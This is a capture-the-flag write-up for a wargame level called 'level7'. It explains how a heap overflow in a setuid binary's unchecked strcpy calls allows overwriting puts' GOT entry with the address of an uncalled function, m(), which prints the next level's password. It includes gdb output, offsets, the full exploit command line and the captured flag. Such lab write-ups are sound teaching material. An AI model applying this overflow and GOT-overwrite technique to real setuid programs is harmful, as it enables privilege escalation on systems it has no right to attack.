# Level7

## 1. Context

```bash
$ id
uid=2064(level6) gid=2064(level6) groups=2064(level6),100(users)

$ ls -la
[...]
-rwsr-s---+ 1 level8 users 5648 Mar 9 2016 level7
[...]
```

## 2. Program behavior

```bash
$ ./level7
Segmentation fault
$ ./level7 test
Segmentation fault
$ ./level7 test test
~~
```

The program needs two arguments. Otherwise it will crash.

## 3. Code overview

The `main()` function:
- allocates two buffers on the heap
- copies the arguments with strcpy (without checking the size)
- reads the file `/home/user/level8/.pass` in a global var `c`
- calls puts("~~")

An uncalled `m()` function :
```c
void m(void)
{
    printf("%s - %d\n", c, time(NULL));
}
```

`m()` prints the content of `c`, containing the flag.

## 4. Exploit

We need to modify `puts()` to call `m()` instead.

For that we need to use the vulnerability located here :
```c
strcpy((char *)a[1], argv[1]);
strcpy((char *)b[1], argv[2]);
```

Both buffers are allocated with `malloc(8)`, but `strcpy()` does not check the size of the input.
This allows a **heap overflow** : by providing a long first argument, we can overwrite adjacent heap data, including the pointer used as the destination for the second `strcpy()`.

So we can control **where the second** `strcpy()` **writes**.

To achieve this, we overwrite the GOT (Global Offset Table) entry of puts().

**Quick explain :**
- PLT (Procedure Linkage Table) = unmodifiable code
- GOT (Global Offset Table) = table of pointers modifiable
We can overwrite a pointer to redirect the exec.

Using gdb :
```bash
(gdb) disas main
[...]
0x080485f7 <+214>:   call   0x8048400 <puts@plt>
[...]

(gdb) info function puts
[...]
0x08048400  puts@plt
[...]

(gdb) disass 0x08048400
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:     jmp    *0x8049928      <---- Found it !!
   0x08048406 <+6>:     push   $0x28
   0x0804840b <+11>:    jmp    0x80483a0
End of assembler dump.
```

We have to overwrite this specific adress with the adress of `m()`.

Address of `m()` :
```bash
(gdb) info function m
[...]
0x080484f4  m
[...]
```

By overflowing the first `strcpy()` and using patterns, we find that:

After **20 bytes**, we overwrite the pointer used as destination for the second `strcpy()`.

So our first argument will be:
```bash
"A" * 20 + "\x28\x99\x04\x08"  <---- puts@got
```

Now everything is ready.

argv[1] -> overwrites the destination of the second strcpy()

argv[2] -> will be written at puts@got

So as a second argument, we will have :
```bash
"\xf4\x84\x04\x08" <---- m
```

## 5. Getting the flag

```bash
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1768409080
```

End of simulation
